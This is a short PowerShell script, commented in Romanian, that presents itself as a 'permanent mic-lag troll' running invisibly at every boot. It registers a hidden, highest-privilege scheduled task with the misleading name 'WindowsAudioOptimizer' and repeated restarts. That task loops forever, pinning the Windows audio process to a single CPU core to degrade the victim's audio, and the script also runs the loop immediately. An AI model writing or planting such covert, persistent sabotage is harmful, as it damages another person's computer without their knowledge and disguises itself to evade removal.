# Permanent mic-lag troll – rulează invizibil la fiecare boot
$action = {
    while ($true) {
        $p = Get-Process audiodg -ErrorAction SilentlyContinue
        if ($p) { $p.ProcessorAffinity = [IntPtr]1 }
        Start-Sleep -Seconds 8
    }
}

# Creează task-ul ascuns care pornește la boot
$taskName = "WindowsAudioOptimizer"
$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command &$action"
$trigger    = New-ScheduledTaskTrigger -AtStartup
$settings   = New-ScheduledTaskSettingsSet -Hidden -AllowStartOnDemand -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $trigger -Settings $settings -RunLevel Highest -Force | Out-Null

# Și rulează imediat o dată
& $action